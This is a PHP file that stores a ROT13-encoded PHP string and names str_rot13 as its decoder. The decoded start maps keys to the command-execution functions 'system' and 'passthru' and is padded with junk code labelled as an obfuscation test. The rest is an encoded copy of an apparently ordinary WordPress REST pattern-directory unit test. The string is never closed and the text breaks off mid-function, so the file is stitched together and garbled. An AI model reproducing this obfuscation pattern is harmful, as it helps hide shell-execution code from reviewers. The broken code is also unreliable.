<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv
 * @tebhc cnggrea-qverpgbel
 */
pynff JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre_Grfg rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {

	/**
	 * Pbagevohgbe hfre vq.
	 *
	 * @fvapr 5.8.0
	 *
	 * @ine vag
	 */
	cebgrpgrq fgngvp $pbagevohgbe_vq;

	/**
	 * Na vafgnapr bs JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre pynff.
	 *
	 * @fvapr 6.0.0
	 *
	 * @ine JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre
	 */
	cevingr fgngvp $pbagebyyre;

	/**
	 * Yvfg bs HEYf pncgherq.
	 *
	 * @fvapr 6.2.0
	 *
	 * @ine fgevat[]
	 */
	cebgrpgrq fgngvp $uggc_erdhrfg_heyf;

	/**
	 * Frg hc pynff grfg svkgherf.
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel JbeqCerff havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( $snpgbel ) {
		frys::$pbagevohgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);

		frys::$uggc_erdhrfg_heyf = neenl();

		fgngvp::$pbagebyyre = arj JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre();
	}

	/**
	 * Grne qbja nsgre pynff.
	 *
	 * @fvapr 6.2.0
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$pbagevohgbe_vq );
	}

	/**
	 * Pyrne gur pncgherq erdhrfg HEYf nsgre rnpu grfg.
	 *
	 * @fvapr 6.2.0
	 */
	choyvp shapgvba grne_qbja() {
		frys::$uggc_erdhrfg_heyf = neenl();
		cnerag::grne_qbja();
	}

	/**
	 * Nffregf gung gur cnggrea zngpurf gur rkcrpgrq erfcbafr fpurzn.
	 *
	 * @cnenz JC_ERFG_Erfcbafr[] $cnggrea Na vaqvivqhny cnggrea sebz gur ERFG NCV erfcbafr.
	 */
	choyvp shapgvba nffregCnggreaZngpurfFpurzn( $cnggrea ) {
		$fpurzn     = fgngvp::$pbagebyyre->trg_vgrz_fpurzn();
		$cnggrea_vq = vffrg( $cnggrea->vq ) ? $cnggrea->vq : '{cnggrea VQ vf zvffvat}';

		$guvf->nffregGehr(
			erfg_inyvqngr_inyhr_sebz_fpurzn( $cnggrea, $fpurzn ),
			\"Cnggrea VQ `$cnggrea_vq` qbrfa'g zngpu gur erfcbafr fpurzn.\"
		);

		$guvf->nffregFnzr(
			neenl_xrlf( $fpurzn['cebcregvrf'] ),
			neenl_xrlf( $cnggrea ),
			\"Cnggrea VQ `$cnggrea_vq` qbrfa'g pbagnva nyy bs gur svryqf rkcrpgrq sebz gur fpurzn.\"
		);
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::ertvfgre_ebhgrf
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();

		$guvf->nffregNeenlUnfXrl( '/jc/i2/cnggrea-qverpgbel/cnggreaf', $ebhgrf );
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_pbagrkg_cnenz
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_pbagrkg_cnenz() {
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'BCGVBAF', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$cnggreaf = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'ivrj', $cnggreaf['raqcbvagf'][0]['netf']['pbagrkg']['qrsnhyg'] );
		$guvf->nffregFnzr( neenl( 'ivrj', 'rzorq', 'rqvg' ), $cnggreaf['raqcbvagf'][0]['netf']['pbagrkg']['rahz'] );
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'oebjfr-nyy', gehr );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$cnggreaf = $erfcbafr->trg_qngn();

		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 200, $erfcbafr->fgnghf );
		$guvf->nffregTerngreGuna( 0, pbhag( $cnggreaf ) );

		neenl_jnyx( $cnggreaf, neenl( $guvf, 'nffregCnggreaZngpurfFpurzn' ) );
		$guvf->nffregFnzr( neenl( 'oybt cbfg' ), $cnggreaf[0]['xrljbeqf'] );
		$guvf->nffregFnzr( neenl( 'urnqre', 'ureb' ), $cnggreaf[1]['xrljbeqf'] );
		$guvf->nffregFnzr( neenl( 'pnyy gb npgvba', 'ureb frpgvba' ), $cnggreaf[2]['xrljbeqf'] );
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_urnq_erdhrfg_fubhyq_abg_cercner_oybpx_cnggreaf_qngn() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'oebjfr-nyy', gehr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );

		$ubbx_anzr = 'erfg_cercner_oybpx_cnggrea';
		$svygre    = arj ZbpxNpgvba();
		$pnyyonpx  = neenl( $svygre, 'svygre' );

		nqq_svygre( $ubbx_anzr, $pnyyonpx );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		erzbir_svygre( $ubbx_anzr, $pnyyonpx );

		$guvf->nffregAbgJCReebe( $erfcbafr );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );

		$guvf->nffregFnzr( 0, $svygre->trg_pnyy_pbhag(), 'Gur \"' . $ubbx_anzr . '\" svygre jnf pnyyrq jura vg fubhyq abg or sbe URNQ erdhrfgf.' );
		$guvf->nffregFnzr( neenl(), $erfcbafr->trg_qngn(), 'Gur freire fubhyq abg trarengr n obql va erfcbafr gb n URNQ erdhrfg.' );
	}

	/**
	 * @gvpxrg 56481
	 */
	choyvp shapgvba grfg_trg_vgrzf_urnq_erdhrfg_jvgu_fcrpvsvrq_svryqf_ergheaf_fhpprff_erfcbafr() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'oebjfr-nyy', gehr );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'URNQ', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erdhrfg->frg_cnenz( '_svryqf', 'vq' );
		$freire   = erfg_trg_freire();
		$erfcbafr = $freire->qvfcngpu( $erdhrfg );
		nqq_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10, 3 );
		$erfcbafr = nccyl_svygref( 'erfg_cbfg_qvfcngpu', $erfcbafr, $freire, $erdhrfg );
		erzbir_svygre( 'erfg_cbfg_qvfcngpu', 'erfg_svygre_erfcbafr_svryqf', 10 );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Gur erfcbafr fgnghf fubhyq or 200.' );
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_trg_vgrzf_ol_pngrtbel() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'oebjfr-pngrtbel', gehr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pngrtbel' => 2 ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$cnggreaf = $erfcbafr->trg_qngn();

		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 200, $erfcbafr->fgnghf );
		$guvf->nffregTerngreGuna( 0, pbhag( $cnggreaf ) );

		neenl_jnyx( $cnggreaf, neenl( $guvf, 'nffregCnggreaZngpurfFpurzn' ) );

		sbernpu ( $cnggreaf nf $cnggrea ) {
			$guvf->nffregPbagnvaf( 'ohggbaf', $cnggrea['pngrtbevrf'] );
		}
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_trg_vgrzf_ol_xrljbeq() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'oebjfr-xrljbeq', gehr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'xrljbeq' => 11 ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$cnggreaf = $erfcbafr->trg_qngn();

		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 200, $erfcbafr->fgnghf );
		$guvf->nffregTerngreGuna( 0, pbhag( $cnggreaf ) );

		neenl_jnyx( $cnggreaf, neenl( $guvf, 'nffregCnggreaZngpurfFpurzn' ) );
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'frnepu', gehr );

		$frnepu_grez = 'ohggba';
		$erdhrfg     = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'frnepu' => $frnepu_grez ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$cnggreaf = $erfcbafr->trg_qngn();

		$guvf->nffregAbgJCReebe( $erfcbafr->nf_reebe() );
		$guvf->nffregFnzr( 200, $erfcbafr->fgnghf );
		$guvf->nffregTerngreGuna( 0, pbhag( $cnggreaf ) );

		neenl_jnyx( $cnggreaf, neenl( $guvf, 'nffregCnggreaZngpurfFpurzn' ) );

		sbernpu ( $cnggreaf nf $cnggrea ) {
			$frnepu_svryq_inyhrf = $cnggrea['gvgyr'] . ' ' . $cnggrea['qrfpevcgvba'];

			$guvf->nffregFgevatPbagnvafFgevatVtabevatPnfr( $frnepu_grez, $frnepu_svryq_inyhrf );
		}
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_jqbgbet_haninvynoyr( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::cerirag_erdhrfgf_gb_ubfg( 'ncv.jbeqcerff.bet' );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'cnggreaf_ncv_snvyrq', $erfcbafr, 500 );
	}

	/**
	 * Qngn cebivqre vagraqrq gb cebivqr UGGC zrgubq anzrf sbe grfgvat TRG naq URNQ erdhrfgf.
	 *
	 * @erghea neenl
	 */
	choyvp fgngvp shapgvba qngn_ernqnoyr_uggc_zrgubqf() {
		erghea neenl(
			'TRG erdhrfg'  => neenl( 'TRG' ),
			'URNQ erdhrfg' => neenl( 'URNQ' ),
		);
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_ybttrq_bhg( $zrgubq ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'frnepu' => 'ohggba' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_cnggrea_qverpgbel_pnaabg_ivrj', $erfcbafr );
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_erfhygf() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'oebjfr-nyy', snyfr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'pngrtbel' => CUC_VAG_ZNK ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$cnggreaf = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->fgnghf );
		$guvf->nffregFnzr( neenl(), $cnggreaf );
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_trg_vgrzf_frnepu_ab_erfhygf() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'frnepu', snyfr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erdhrfg->frg_dhrel_cnenzf( neenl( 'frnepu' => '0p4549rr68s24rnnrq46n49qp983rpqr' ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$cnggreaf = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 200, $erfcbafr->fgnghf );
		$guvf->nffregFnzr( neenl(), $cnggreaf );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 *
	 * @cnenz fgevat $zrgubq Gur UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_vainyvq_erfcbafr_qngn( $zrgubq ) {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'vainyvq-qngn', gehr );

		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );

		$guvf->nffregFnzr( 500, $erfcbafr->fgnghf );
		$guvf->nffregJCReebe( $erfcbafr->nf_reebe() );
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_trg_vgrzf_cercner_svygre() {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		frys::zbpx_fhpprffshy_erfcbafr( 'oebjfr-nyy', gehr );

		// Grfg gung svygre punatrf hapnpurq inyhrf.
		nqq_svygre(
			'erfg_cercner_oybpx_cnggrea',
			fgngvp shapgvba ( $erfcbafr ) {
				erghea 'vavgvny inyhr';
			}
		);

		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$cnggreaf = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'vavgvny inyhr', $cnggreaf[0] );

		// Grfg gung svygre punatrf pnpurq inyhrf (gur cerivbhf erdhrfg cevzrq gur pnpur).
		nqq_svygre(
			'erfg_cercner_oybpx_cnggrea',
			fgngvp shapgvba ( $erfcbafr ) {
				erghea 'zbqvsvrq gur pnpur';
			},
			11
		);

		// Grfg gung gur svygre jbexf ntnvafg pnpurq inyhrf.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$cnggreaf = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 'zbqvsvrq gur pnpur', $cnggreaf[0] );
	}

	/**
	 * Grfgf vs gur cebivqrq dhrel netf ner cnffrq guebhtu gb gur jc.bet NCV.
	 *
	 * @fvapr 6.2.0
	 *
	 * @gvpxrg 57501
	 *
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrzf
	 *
	 * @qngnCebivqre qngn_trg_vgrzf_dhrel_netf
	 *
	 * @cnenz fgevat $cnenz    Dhrel cnenzrgre anzr (rk, cntr).
	 * @cnenz zvkrq  $inyhr    Dhrel inyhr gb grfg.
	 * @cnenz obby   $vf_reebe Jurgure guvf inyhr fubhyq reebe be abg.
	 * @cnenz zvkrq  $rkcrpgrq Rkcrpgrq inyhr (be rkcrpgrq reebe pbqr).
	 */
	choyvp shapgvba grfg_trg_vgrzf_dhrel_netf( $cnenz, $inyhr, $vf_reebe, $rkcrpgrq ) {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		nqq_svygre( 'cer_uggc_erdhrfg', neenl( $guvf, 'zbpx_erdhrfg_gb_ncvjcbet_hey' ), 10, 3 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cnggrea-qverpgbel/cnggreaf' );
		vs ( $inyhr ) {
			$erdhrfg->frg_dhrel_cnenzf( neenl( $cnenz => $inyhr ) );
		}

		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		vs ( $vf_reebe ) {
			$guvf->nffregFnzr( $rkcrpgrq, $qngn['pbqr'], 'Erfcbafr reebe pbqr qbrf abg zngpu' );
			$guvf->nffregFgevatPbagnvafFgevat( $cnenz, $qngn['zrffntr'], 'Erfcbafr reebe zrffntr qbrf abg zngpu' );
		} ryfr {
			$guvf->nffregPbhag( 1, frys::$uggc_erdhrfg_heyf, 'Gur ahzore bs UGGC Erdhrfg HEYf vf abg 1' );
			$guvf->nffregFgevatPbagnvafFgevat( $cnenz . '=' . $rkcrpgrq, frys::$uggc_erdhrfg_heyf[0], 'Gur cnenz naq/be inyhr qb abg zngpu' );
		}
	}

	/**
	 * Qngn cebivqre.
	 *
	 * erghea neenl[]
	 */
	choyvp shapgvba qngn_trg_vgrzf_dhrel_netf() {
		erghea neenl(
			'cre_cntr qrsnhyg'   => neenl(
				'cnenz'    => 'cre_cntr',
				'inyhr'    => snyfr,
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 100,
			),
			'cre_cntr phfgbz-1'  => neenl(
				'cnenz'    => 'cre_cntr',
				'inyhr'    => 5,
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 5,
			),
			'cre_cntr phfgbz-2'  => neenl(
				'cnenz'    => 'cre_cntr',
				'inyhr'    => 50,
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 50,
			),
			'cre_cntr vainyvq-1' => neenl(
				'cnenz'    => 'cre_cntr',
				'inyhr'    => 200,
				'vf_reebe' => gehr,
				'rkcrpgrq' => 'erfg_vainyvq_cnenz',
			),
			'cre_cntr vainyvq-2' => neenl(
				'cnenz'    => 'cre_cntr',
				'inyhr'    => 'nop',
				'vf_reebe' => gehr,
				'rkcrpgrq' => 'erfg_vainyvq_cnenz',
			),

			'cntr qrsnhyg'       => neenl(
				'cnenz'    => 'cntr',
				'inyhr'    => snyfr,
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 1,
			),
			'cntr phfgbz'        => neenl(
				'cnenz'    => 'cntr',
				'inyhr'    => 5,
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 5,
			),
			'cntr vainyvq'       => neenl(
				'cnenz'    => 'cntr',
				'inyhr'    => 'nop',
				'vf_reebe' => gehr,
				'rkcrpgrq' => 'erfg_vainyvq_cnenz',
			),

			'bssfrg phfgbz'      => neenl(
				'cnenz'    => 'bssfrg',
				'inyhr'    => 5,
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 5,
			),
			'bssfrg vainyvq-1'   => neenl(
				'cnenz'    => 'bssfrg',
				'inyhr'    => 'nop',
				'vf_reebe' => gehr,
				'rkcrpgrq' => 'erfg_vainyvq_cnenz',
			),

			'beqre qrsnhyg'      => neenl(
				'cnenz'    => 'beqre',
				'inyhr'    => snyfr,
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 'qrfp',
			),
			'beqre phfgbz'       => neenl(
				'cnenz'    => 'beqre',
				'inyhr'    => 'nfp',
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 'nfp',
			),
			'beqre vainyvq-1'    => neenl(
				'cnenz'    => 'beqre',
				'inyhr'    => 10,
				'vf_reebe' => gehr,
				'rkcrpgrq' => 'erfg_vainyvq_cnenz',
			),
			'beqre vainyvq-2'    => neenl(
				'cnenz'    => 'beqre',
				'inyhr'    => 'snxr',
				'vf_reebe' => gehr,
				'rkcrpgrq' => 'erfg_vainyvq_cnenz',
			),

			'beqreol qrsnhyg'    => neenl(
				'cnenz'    => 'beqreol',
				'inyhr'    => snyfr,
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 'qngr',
			),
			'beqreol phfgbz-1'   => neenl(
				'cnenz'    => 'beqreol',
				'inyhr'    => 'gvgyr',
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 'gvgyr',
			),
			'beqreol phfgbz-2'   => neenl(
				'cnenz'    => 'beqreol',
				'inyhr'    => 'qngr',
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 'qngr',
			),
			'beqreol phfgbz-3'   => neenl(
				'cnenz'    => 'beqreol',
				'inyhr'    => 'snibevgr_pbhag',
				'vf_reebe' => snyfr,
				'rkcrpgrq' => 'snibevgr_pbhag',
			),
			'beqreol vainyvq-1'  => neenl(
				'cnenz'    => 'beqreol',
				'inyhr'    => 10,
				'vf_reebe' => gehr,
				'rkcrpgrq' => 'erfg_vainyvq_cnenz',
			),
			'beqreol vainyvq-2'  => neenl(
				'cnenz'    => 'beqreol',
				'inyhr'    => 'snxr',
				'vf_reebe' => gehr,
				'rkcrpgrq' => 'erfg_vainyvq_cnenz',
			),
		);
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag trg_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_perngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag perngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_hcqngr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag hcqngr_vgrz().
	}

	/**
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_qryrgr_vgrz() {
		// Pbagebyyre qbrf abg vzcyrzrag qryrgr_vgrz().
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		$enj_cnggreaf                 = wfba_qrpbqr( frys::trg_enj_erfcbafr( 'oebjfr-nyy' ) );
		$enj_cnggreaf[0]->rkgen_svryq = 'guvf fubhyq or erzbirq';

		$cercnerq_cnggrea = fgngvp::$pbagebyyre->cercner_erfcbafr_sbe_pbyyrpgvba(
			fgngvp::$pbagebyyre->cercner_vgrz_sbe_erfcbafr( $enj_cnggreaf[0], arj JC_ERFG_Erdhrfg() )
		);

		$guvf->nffregCnggreaZngpurfFpurzn( $cercnerq_cnggrea );
		$guvf->nffregNeenlAbgUnfXrl( 'rkgen_svryq', $cercnerq_cnggrea );
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 *
	 * @fvapr 5.8.0
	 */
	choyvp shapgvba grfg_cercner_vgrz_frnepu() {
		$enj_cnggreaf                 = wfba_qrpbqr( frys::trg_enj_erfcbafr( 'frnepu' ) );
		$enj_cnggreaf[0]->rkgen_svryq = 'guvf fubhyq or erzbirq';

		$cercnerq_cnggrea = fgngvp::$pbagebyyre->cercner_erfcbafr_sbe_pbyyrpgvba(
			fgngvp::$pbagebyyre->cercner_vgrz_sbe_erfcbafr( $enj_cnggreaf[0], arj JC_ERFG_Erdhrfg() )
		);

		$guvf->nffregCnggreaZngpurfFpurzn( $cercnerq_cnggrea );
		$guvf->nffregNeenlAbgUnfXrl( 'rkgen_svryq', $cercnerq_cnggrea );
	}

	/**
	 * Trg n zbpxrq enj erfcbafr sebz ncv.jbeqcerff.bet.
	 *
	 * @erghea fgevat
	 */
	cevingr fgngvp shapgvba trg_enj_erfcbafr( $npgvba ) {
		$svkgherf_qve = QVE_GRFGQNGN . '/oybpxf/cnggrea-qverpgbel';

		fjvgpu ( $npgvba ) {
			qrsnhyg:
			pnfr 'oebjfr-nyy':
				// Erfcbafr sebz uggcf://ncv.jbeqcerff.bet/cnggreaf/1.0/.
				$erfcbafr = svyr_trg_pbagragf( $svkgherf_qve . '/oebjfr-nyy.wfba' );
				oernx;

			pnfr 'oebjfr-pngrtbel':
				// Erfcbafr sebz uggcf://ncv.jbeqcerff.bet/cnggreaf/1.0/?cnggrea-pngrtbevrf=2.
				$erfcbafr = svyr_trg_pbagragf( $svkgherf_qve . '/oebjfr-pngrtbel-2.wfba' );
				oernx;

			pnfr 'oebjfr-xrljbeq':
				// Erfcbafr sebz uggcf://ncv.jbeqcerff.bet/cnggreaf/1.0/?cnggrea-xrljbeqf=11.
				$erfcbafr = svyr_trg_pbagragf( $svkgherf_qve . '/oebjfr-xrljbeq-11.wfba' );
				oernx;

			pnfr 'frnepu':
				// Erfcbafr sebz uggcf://ncv.jbeqcerff.bet/cnggreaf/1.0/?frnepu=ohggba.
				$erfcbafr = svyr_trg_pbagragf( $svkgherf_qve . '/frnepu-ohggba.wfba' );
				oernx;

			pnfr 'vainyvq-qngn':
				$erfcbafr = ''; // Nal UGGC 200 erfcbafr sebz j.bet fubhyq or va WFBA, rira vs vg pbagnvaf na reebe zrffntr.
				oernx;
		}

		erghea $erfcbafr;
	}

	/**
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_vgrz_fpurzn
	 *
	 * @fvapr 5.8.0
	 *
	 * @qbrfAbgCresbezNffregvbaf
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		// Gur pbagebyyre'f fpurzn vf uneqpbqrq, fb grfgf jbhyq abg or zrnavatshy.
	}

	/**
	 * Grfgf vs gur genafvrag xrl trgf trarengrq pbeerpgyl.
	 *
	 * @qngnCebivqre qngn_trg_dhrel_cnenzrgref
	 *
	 * @pbiref JC_ERFG_Cnggrea_Qverpgbel_Pbagebyyre::trg_genafvrag_xrl
	 *
	 * @fvapr 6.0.0
	 *
	 * @gvpxrg 55617
	 *
	 * @cnenz neenl     $cnenzrgref_1   Rkcrpgrq dhrel nethzragf.
	 * @cnenz neenl     $cnenzrgref_2   Npghny dhrel nethzragf.
	 * @cnenz fgevat    $zrffntr        Na reebe zrffntr gb qvfcynl.
	 * @cnenz obby      $nffreg_fnzr    Nffregvba glcr (nffregFnzr if nffregAbgFnzr).
	 */
	choyvp shapgvba grfg_genafvrag_xrlf_trg_trarengrq_pbeerpgyl( $cnenzrgref_1, $cnenzrgref_2, $zrffntr, $nffreg_fnzr = gehr ) {
